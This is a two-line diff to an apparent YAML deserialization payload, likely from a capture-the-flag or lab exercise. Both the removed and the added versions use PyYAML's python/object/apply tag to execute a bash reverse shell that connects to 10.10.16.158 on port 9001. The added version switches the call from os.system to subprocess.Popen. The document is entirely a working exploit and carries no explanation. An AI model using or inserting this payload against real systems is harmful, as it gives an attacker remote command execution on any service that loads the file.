@@ -1,2 +1,2 @@
-!!python/object/apply:os.system
-- "bash -c 'bash -i >& /dev/tcp/10.10.16.158/9001 0>&1'"
+!!python/object/apply:subprocess.Popen
+- ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.16.158/9001 0>&1"]
